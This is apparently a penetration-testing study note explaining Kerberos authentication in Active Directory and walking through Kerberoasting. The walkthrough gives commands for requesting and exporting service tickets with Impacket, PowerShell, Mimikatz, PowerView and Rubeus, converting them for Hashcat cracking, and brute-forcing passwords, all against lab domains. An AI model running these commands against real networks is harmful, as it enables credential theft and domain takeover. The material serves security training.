---
title: "KERBEROS"
date: 2023-07-13
draft: false
tags: ["Active-Directory"]
description: "Active Directory kerberos"
---


![](https://redfoxsec.com/wp-content/uploads/2023/03/attacking-kerberos-part-2-thumbnail.png)
## Kerberoasting
    
The Kerberos protocol defines how clients interact with a network authentication service, clients obtain tickets from the Kerberos Key Distribution Center (KDC) and they submit these tickets to application servers when connections are established. uses port 88 by default and depends on the process of symmetric key cryptography.
    
*NB* [****kerberos uses tickets to authenticate a user and completely avoids sending passwords across the network**]**
    
![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*J6UHDf5fnbzdKTPawNq3UA.png)
    
### How Kerb Auth works!
        
In every Active Directory domain, every domain controller runs a KDC service that provides requests for tickets to kerberos, which is the KRBTGT account in the AD domain.
        
![1.webp](https://1.bp.blogspot.com/-XHZj0n9oH_g/XrHWMs_s-uI/AAAAAAAAj2E/oxSrDD2wvOEMv-a-nTHhQD2jc-3KMULYgCLcBGAsYHQ/s1600/1.png)
        
Kerberos uses symmetric cryptography for encryption and decryption.
        
For explanation purposes, we use three colours to distinguish Hashes:
        
- **BLUE _KEY**: User NTLM HASH
- **YELLOW_KEY**: Krbtgt NTLM HASH
- **RED_KEY:** Service NTLM HASH
        
**Step 1:** By sending the request message to KDC, the client initializes communication as:
        
***KRB_AS_REQ contains the following:***
        
- The username of the client is to be authenticated.
- *The service **SPN (SERVICE PRINCIPAL NAME)** linked with the Krbtgt account*
- *An encrypted timestamp (Locked with User Hash: Blue Key)*
        
The entire message is encrypted using the User NTLM hash (**Locked with BLUE KEY**) to authenticate the user and prevent replay attacks.
        
**Step 2:** The KDC uses a database consisting of Users/Krbtgt/Services hashes to decrypt a message (**Unlock with BLUE KEY**) that authenticates user identification.
        
Then KDC will generate TGT (Ticket Granting Ticket) for a client that is encrypted using Krbtgt hash (Locked with Yellow Key) & some Encrypted Message using User Hash.
        
***KRB_AS_REP contains the following:***
        
- ***Username***
- *Some encrypted data, (Locked with User Hash: Blue Key) that contains:*
- *Session key*
- *The expiration date of TGT*
- ***TGT**, (Locked with Krbtgt Hash: Yellow Key) which contains:*
- *Username*
- *Session key*
- *The expiration date of TGT*
- *PAC with user privileges, signed by KDC*
        
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8cs4DxTHhCqS9yUAa3yOwC8e3ElB50XZ4QyOkWXIEAGssMdjBPNsGVaDz274Z8voKtHNoBHD9qD6PKPvp9KLzdxjUzRtSc_UQ7Jz03v5BHEwhP7wm09K-81SGcv3qTyJ1UDyctCHyDc_PgLZbe4A5GipaqZmDU649RWcNbQtIpM6o6DvKicqXTU5vQA/s16000/2.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8cs4DxTHhCqS9yUAa3yOwC8e3ElB50XZ4QyOkWXIEAGssMdjBPNsGVaDz274Z8voKtHNoBHD9qD6PKPvp9KLzdxjUzRtSc_UQ7Jz03v5BHEwhP7wm09K-81SGcv3qTyJ1UDyctCHyDc_PgLZbe4A5GipaqZmDU649RWcNbQtIpM6o6DvKicqXTU5vQA/s16000/2.png?w=640&ssl=1)
        
**Step 3:** The KRB_TGT will be stored in the Kerberos tray (Memory) of the client machine, as the user already has the KRB_TGT, which is used to identify himself for the TGS request. The client sent a copy of the TGT with the encrypted data to KDC.
        
***KRB_TGS_REQ** contains:*
        
- *Encrypted data with the session key*
- *Username*
- *Timestamp*
- *TGT*
- *SPN of requested service e.g. SQL service*
        
**Step 4:** The KDC receives the KRB_TGS_REQ message and decrypts the message using Krbtgt hash to verify TGT (Unlock using Yellow key), then KDC returns a TGS as KRB_TGS_REP which is encrypted using requested service hash **(Locked with Red Key)** & Some Encrypted Message using User Hash.
        
***KRB_TGS_REP contains:***
        
- *Username*
- *Encrypted data with the session key:*
- *Service session key*
- *The expiration date of TGS*
- ***TGS**, (Service Hash: RED Key) which contains:*
- *Service session key*
- *Username*
- *The expiration date of TGS*
- *PAC with user privileges, signed by KDC*
        
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEljfKE_fFEoR8kThrILtnjmFwQPfM61p-SZh6Xg64sLUv7GzLgsvk6Ni5YhC8A7ILETnBFHbsa2ldkL6u1mrWGkDStzkFSP9oCeg3cO_9QxjyltM0ZpKm5Jf2oV8lo-IsfR2C7-jAAaRyWTu_Sofn4TV7BhIl0fj5fYPIicSjbScOtyUql25EmTo-Tw/s16000/3.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEljfKE_fFEoR8kThrILtnjmFwQPfM61p-SZh6Xg64sLUv7GzLgsvk6Ni5YhC8A7ILETnBFHbsa2ldkL6u1mrWGkDStzkFSP9oCeg3cO_9QxjyltM0ZpKm5Jf2oV8lo-IsfR2C7-jAAaRyWTu_Sofn4TV7BhIl0fj5fYPIicSjbScOtyUql25EmTo-Tw/s16000/3.png?w=640&ssl=1)
        
**Step 5:** The user sends the copy of TGS to the Application Server,
        
***KRB_AP_REQ contains:***
        
- *TGS*
- *Encrypted data with the service session key:*
- *Username*
- *Timestamp, to avoid replay attacks*
        
**Step 6:** The application attempts to decrypt the message using its NTLM hash and to verify the PAC from KDC to identify user Privilege which is an optional case.
        
**Step 7:**  KDC verifies PAC (Optional)
        
**Step 8:**  Allow the user to access the service for a specific time.
        
## SPNs
        
The Service Principal Name (SPN) is a unique identifier for a service instance. Active Directory Domain Services and Windows provide support for Service Principal Names (SPNs), which are key components of the Kerberos mechanism through which a client authenticates a service.
        
**Important Points**
        
- If you install multiple instances of a service on computers throughout a forest, each instance must have its SPN.
- Before the Kerberos authentication service can use an SPN to authenticate a service, the SPN must be registered on the account.
- A given SPN can be registered on only one account.
- An SPN must be unique in the forest in which it is registered.
- If it is not unique, authentication will fail.

### SPNS syntax

**The SPN syntax has four elements**
        
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5w4iPbIsIxS5VNUzD13_nOXg-0AbmhtwdJWBUqi4keSFbajcnh5Bgqro7FOj686VwDTBbtu0oYjZbBGRyRWxUHy8EAJp8jmUQpDBymwTWzE_9RIpwOkK2Ul6bxIbDZSwHYhknzECBwjBEd4VU5HyMeCciosGRPfcjbaN62fLe6WPiArdLqlHrpGMKOQ/s16000/5.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5w4iPbIsIxS5VNUzD13_nOXg-0AbmhtwdJWBUqi4keSFbajcnh5Bgqro7FOj686VwDTBbtu0oYjZbBGRyRWxUHy8EAJp8jmUQpDBymwTWzE_9RIpwOkK2Ul6bxIbDZSwHYhknzECBwjBEd4VU5HyMeCciosGRPfcjbaN62fLe6WPiArdLqlHrpGMKOQ/s16000/5.png?w=640&ssl=1)
        
### Type of SPN
        
- Host-based SPNs which is associated with the computer account in AD, it is randomly generated 128-character long password which is changed every 30 days; hence it is no use in Kerberoasting attacks
- SPNs that have been associated with a domain user account where NTLM hash will be used.


### Linux Perspective
        
        
#### Attack Procedure.
       
Depending on your positioning a network, Kerberos attacks can be performed in multiple ways.
        
- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows, the host is authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.
        
#### Tools.
        
Some tools can be utilized to perform the attack.
        
- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.
        
        
**********************REMEMBER!!!**********************

Obtaining a TGS ticket via kerberoasting does not guarantee a set of valid credentials and the ticket still must be cracked offline to obtain the cleartext password.
        
TGS tickets generally take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using s standard cracking rig.
        

        
#### The efficiency of Attack
        
While it can be a great way to move lateral or escalate privileges in a domain kerberoasting and the presence of SPNs does not guarantee us any level of access.
        
We might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise. Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access.
        
**N/B -** When writing a report this finding is termed as high-risk in the first two cases. Third case we may Kerberos and end up unable to crack a single TGS ticket even after mad days of cracking attempts with Hashcat. This would be dropped as a medium-risk issue to make the client aware of the risk of SPNs in the domain.
        
        
**********************REMEMBER!!!**********************
        
A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.
        

#### GetUserSPNs.py
        
**Listing SPN Accounts.**
        
`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend`
        
#### Requesting all TGS tickets.**
        
Later on, we can pull all TGS tickets for offline processing using the **-request** flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or Johnny for offline password-cracking attempts.
        
`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request`
        
#### Requesting a Single TGS Ticket.
        
Wte can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the required account.
        
`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user`
        
With this ticket in hand, we could attempt, to crack the password offline, if successful we may end up with Domain Admin Rights.
        
Saving the Ticket o facilitate offline cracking, it is always good to use the `-outputfile` flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.
        
`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs`
        
### Windows Perspective
        
Kerberoasting - Semi-Manual Method.
        
#### Enumerating SPNs with setspn.exe
        
`setspn.exe -Q */*` running the command you’ll notice many different SPNs returned for the various hosts in the domain.
        
#### Retrieving All Tickets using setspn.exe
        
`setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }`
        
The above command combines the previous command with `setspn.exe` to request tickets for all accounts with SPNs set.
        
Using ******************Powershell****************** we can request TGS tickets for an account in the shell and load them into memory, once they are loaded into memory we can extract them using **Mimkatz.**
        
#### Targeting a Single User**************
        
```powershell
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
        
Before moving on, let's break down the commands above to see what we are doing (which is essentially what is used by [Rubeus](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1) when using the default Kerberoasting method):
        
- The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
- The `AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
- [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
- We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
- We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session
        
We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.
        
Now that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.
        
### Extracting Tickets from Memory with Mimikatz
        
```powershell
        Using 'mimikatz.log' for logfile : OK
        
        mimikatz # base64 /out:true
        isBase64InterceptInput  is false
        isBase64InterceptOutput is true
        
        mimikatz # kerberos::list /export
        
        <SNIP>
        
        [00000002] - 0x00000017 - rc4_hmac_nt
           Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
           Server Name: MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
           Client Name: htb-student @ INLANEFREIGHT.LOCAL
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
        ====================
        Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
        ====================
        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
        ZWZyZWlnaHQubG9jYWw6MTQzMw==
        ====================
        
           * Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
```
        
If we don’t specify the **base64 /out:true** command, Mimikatz will extract the tickets and write the to **.kirbi** files. 
        
 Next, you prepare the base blob for cracking `echo "<base64 blob>" |  tr -d \\n` then place the above into a file and convert it back to a **.kirbi** file using the base64 utility.`cat encoded_file | base64 -d > sqldev.kirbi`
        
 Extract the kerberos ticket using [kirbi2john.py](http://kirbi2john.py) this will create a file called **crack_file,** which then must be modified to be able to use Hashcat against the hash `python2.7 kirbi2john.py sqldev.kirbi`
        
Modifying the crack file for hashcat `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat` now you can run the ticket through hashcat and get a clear password.
        
#### Skipped Version
        
So if we decide to skip the base64 output with mimkatz and type **mimikatz # kerberos::list /export,** the **.kirbi** file will be written to disk, in this case, you can download the file and run **[kirbi2john.py](http://kirbi2john.py)** against them directly, skipping the base64 decoding step.
        
#### AUTOMATE VERSION
        
Using [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to extract the TGS ticket and convert them to Hashcat format.
        
**Extracting TGS Ticket**
        
```powershell
        PS C:\htb> Import-Module .\PowerView.ps1
        PS C:\htb> Get-DomainUser * -spn | select samaccountname
        PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
        
**Target Specific User**
        
`Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat`
        
**Exporting All Tickets to a CSV file and viewing the Content**
        
`Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation`
        
`cat .\ilfreight_tgs.csv`
        
## REBEUS
            
[https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
            
A tool capable of performing kerberoasting faster and easier by providing a variety of options to interact with kerberos
            
[https://www.hackingarticles.in/a-detailed-guide-on-rubeus/](https://www.hackingarticles.in/a-detailed-guide-on-rubeus/)
            
### **Ticket Operations**
            
Working in an Active Directory environment depends on various tickets. For example, a Ticket Granting Ticket is an authentication token issued by the KDC which is used to request access from TGS for specific resources.
            
In this section, we’ll talk about Rubeus and its capability to play around with tickets.
            
#### Asktgt
            
Rubeus can generate raw AS-REQ traffic in order to ask for a TGT with a provided username and password. The password can also be encrypted in RC4, AES or DES encryption and it would still work. Let’s see an example where a clear-text password is supplied
            
`rubeus.exe asktgt /user:harshitrajpal /password: Password@1`
            
 ![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoZ7cs-QGTlKd5Bzpz77QkG6O6Fi72ldE6ow6UL-XPUd9C67hSeOJi9oqI3KMjzHTeXnrzsh4gfW3_YzzHX-Vo79aphiKA-HUtp49i8dnjHouPnzQQ1Jiwjr9VToCj5KtwWhqgKICUBgw2CTYT47tQELkP85ZBab2vugzQn6WmCr5hj5uZMJ-dITJOhg/s16000/7.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoZ7cs-QGTlKd5Bzpz77QkG6O6Fi72ldE6ow6UL-XPUd9C67hSeOJi9oqI3KMjzHTeXnrzsh4gfW3_YzzHX-Vo79aphiKA-HUtp49i8dnjHouPnzQQ1Jiwjr9VToCj5KtwWhqgKICUBgw2CTYT47tQELkP85ZBab2vugzQn6WmCr5hj5uZMJ-dITJOhg/s16000/7.png?w=640&ssl=1)
            
As you can see above that a KRBTGT has been successfully generated which can be further used to generate TGS. The same can be achieved by providing an encrypted password. Let’s use a password encrypted with the RC4 cipher.
            
`rubeus.exe asktgt /user:harshitrajpal /rc4:64FBAE31CC352FC26AF97CBDEF151E03`
            
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6vfMUCFomJiyWrerwcZuM3nwQpfznhLsINzT8AiGJoXTgS0g42p3tERFo0ub34PI3SLF_XLstk_lq9rrbJE4Vjq6Wfvdho0Ntfs870KbT5wB9Mxk-vHTcAht8sC4fkWmU5YV_0BkOm5ILs9gJ8Nq6euvG-wncjJMfoaTn1fc5MpmzXNXSTjmm2JPc4g/s16000/8.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6vfMUCFomJiyWrerwcZuM3nwQpfznhLsINzT8AiGJoXTgS0g42p3tERFo0ub34PI3SLF_XLstk_lq9rrbJE4Vjq6Wfvdho0Ntfs870KbT5wB9Mxk-vHTcAht8sC4fkWmU5YV_0BkOm5ILs9gJ8Nq6euvG-wncjJMfoaTn1fc5MpmzXNXSTjmm2JPc4g/s16000/8.png?w=640&ssl=1)
            
**Asktgs**
            
Rubeus has an asktgs option which can build raw TGS-REP requests by providing a ticket either in the CLI argument or by providing a path to a ticket.kirbi file placed on disk. Each TGS has a specified purpose.
            
For example, let’s create a TGS for the LDAP service. One or more service SPNs can be provided.
            
`rubeus.exe asktgs /user:harshitrajpal /ticket:doIFNDCCBTCgAwIBB...bA== /service:LDAP/dc1.ignite.local`            
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMI6bD_rWmk3OnNX-A2fyRHpOAOuMB9C_79YtSoJITgwK-vMjtkrKnt8HmLMzt6zM0amwmzw8khiMatpV1CW9XCCRjp-1qhcbIWxz3yDZFfNs04v3DGllEd0ZROjkRqwd1ghVF3WbPCfx6HReUAb67OMvMV7IKrIl4zIa5oEwoIwTjRHSO5EJcNCqPIg/s16000/9.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMI6bD_rWmk3OnNX-A2fyRHpOAOuMB9C_79YtSoJITgwK-vMjtkrKnt8HmLMzt6zM0amwmzw8khiMatpV1CW9XCCRjp-1qhcbIWxz3yDZFfNs04v3DGllEd0ZROjkRqwd1ghVF3WbPCfx6HReUAb67OMvMV7IKrIl4zIa5oEwoIwTjRHSO5EJcNCqPIg/s16000/9.png?w=640&ssl=1)
            
By providing in the TGT we generated in the previous step (copying in notepad and removing enters to type the ticket in a single line) we have generated a TGS successfully.
            
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZIVjHBOo3oUV7kNLe-E4sPeFKTAwW2e0nUV2BxXFxZ2R_Bni2LUjvkiKIL6o0Ugfs_S5N2Q8f383lwlGR0ZYYEcY0VNeha3W0UHtCM8-LaYDxBDWL8GUww5gK3Bb29OUr5U5FB2trJ4h7A3hJEP6BGlNBjcmbBBnaQ2pGfA1Yq7d0REz4DLydwjMjcw/s16000/10.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZIVjHBOo3oUV7kNLe-E4sPeFKTAwW2e0nUV2BxXFxZ2R_Bni2LUjvkiKIL6o0Ugfs_S5N2Q8f383lwlGR0ZYYEcY0VNeha3W0UHtCM8-LaYDxBDWL8GUww5gK3Bb29OUr5U5FB2trJ4h7A3hJEP6BGlNBjcmbBBnaQ2pGfA1Yq7d0REz4DLydwjMjcw/s16000/10.png?w=640&ssl=1)
            
### Klist
            
Klist command in Windows can be used to view the tickets generated in the system. Here, when we run klist command we can see that a KRBTGT and an LDAP TGS have been generated and stored in the session.
            
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXmMQ3Twpy5cfkNrwiuysEB9XtIXh5Onuq41Bmss3tO8zzDskS2mgte_KiIvRlPd_RyXr0MAFRP1tuBCkp4nZsAnXwW_gvyP0Fc0LsftC28dDE-V4DQIGExLvnrGD37LUhlyzROJIrdVf4hBDa0HNFhlZzjLIzQfedFGmAA3UzYsbDNPP-7dSmT2mL3w/s16000/11.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXmMQ3Twpy5cfkNrwiuysEB9XtIXh5Onuq41Bmss3tO8zzDskS2mgte_KiIvRlPd_RyXr0MAFRP1tuBCkp4nZsAnXwW_gvyP0Fc0LsftC28dDE-V4DQIGExLvnrGD37LUhlyzROJIrdVf4hBDa0HNFhlZzjLIzQfedFGmAA3UzYsbDNPP-7dSmT2mL3w/s16000/11.png?w=640&ssl=1)
            
### Renew
            
The renew function in Rubeus builds a TGT renewal exchange. We can specify a domain controller using the /dc flag which will be used as a destination for the renewal traffic. We can further use the **tgtdeleg** option with this and extract user’s credentials without elevation and keep it alive on another system for a week by default.
            
**/ptt** flag can also be used in conjunction to apply the Kerberos
            
`rubeus.exe renew /dc:dc1.ignite.local /ticket:doIFNDCCB....bA==`
            
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0GpSeTg61s0HWOXUHdRK5JkiFgSUmbHE6Hu8QPFINoVu4eEqrhwjcHgkE1N0vy8W_JenfEymZ7Wuzom7DSJ6SB_4A-t6xhhM3YXnM8gN0gu8AVq1yI0boCr_kPi_igdmkLF6SXz_42IPOR0qLwkAk6TffeJVnoZkAvNtc6zcQaccR5YRLVheZyn2dfQ/s16000/12.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0GpSeTg61s0HWOXUHdRK5JkiFgSUmbHE6Hu8QPFINoVu4eEqrhwjcHgkE1N0vy8W_JenfEymZ7Wuzom7DSJ6SB_4A-t6xhhM3YXnM8gN0gu8AVq1yI0boCr_kPi_igdmkLF6SXz_42IPOR0qLwkAk6TffeJVnoZkAvNtc6zcQaccR5YRLVheZyn2dfQ/s16000/12.png?w=640&ssl=1)
            
**/autorenew** sub-function will put the exchange to sleep for endTime 30 minutes and after that window automatically renew the TGT and display the renewed ticket
            
`rubeus.exe renew /dc:dc1.ignite.local /autorenew /ticket:doIFNDCCBTCgAw...bA==`
            
 ![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirxuh_4JAood6FK5wMIFjbbs0mBlJXHHg46gL0FKhJWDkjDN3w9wfsBIexmRzJAtlxXozcTEeCVpU6C46ls0Pfp71GSt6jQTo9ma5H7Vph83B8TsK9lpiHim6VtnmtHOxxdXiLt1dEorn2IWthB-ugOAgUBNXAmseTdzwrlN7MjsNfuW6mQAsP8Y3FJw/s16000/14.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirxuh_4JAood6FK5wMIFjbbs0mBlJXHHg46gL0FKhJWDkjDN3w9wfsBIexmRzJAtlxXozcTEeCVpU6C46ls0Pfp71GSt6jQTo9ma5H7Vph83B8TsK9lpiHim6VtnmtHOxxdXiLt1dEorn2IWthB-ugOAgUBNXAmseTdzwrlN7MjsNfuW6mQAsP8Y3FJw/s16000/14.png?w=640&ssl=1)
            
As you may now observe that after a specified time interval a renewed TGT is shown
            
![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9bgCsSYADAltUs7Q3vRTfTZDSOf9wRunhlIc3WNMZQChVO_iVgdHe8bCNACLVVLt4o4Ewk9U78KMJ3wiuwYiQGmsuWgp0W6T3wLYBVOKmBS7VZjRBPxEZJs_Tx-slKrZI9fPJxIKrhQXu7tbQR3966yrXxlLgVFsOFzb-zOtRAhv2U4Wb1xoa9HuNxQ/s16000/15.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9bgCsSYADAltUs7Q3vRTfTZDSOf9wRunhlIc3WNMZQChVO_iVgdHe8bCNACLVVLt4o4Ewk9U78KMJ3wiuwYiQGmsuWgp0W6T3wLYBVOKmBS7VZjRBPxEZJs_Tx-slKrZI9fPJxIKrhQXu7tbQR3966yrXxlLgVFsOFzb-zOtRAhv2U4Wb1xoa9HuNxQ/s16000/15.png?w=640&ssl=1)
            
**Brute**
            
The brute option in Rubeus can be used to perform a password bruteforce attack against all the existing user accounts in Active Directory. Many times, the same password is used with multiple accounts in real-life enterprise infrastructure. So, brute option can generate multiple TGTs in those accounts having the same password. /noticket can be used in conjunction with this option since no ticket is provided with this functionality. For example,
            
`rubeus.exe brute /password:Password@1 /noticket`
            
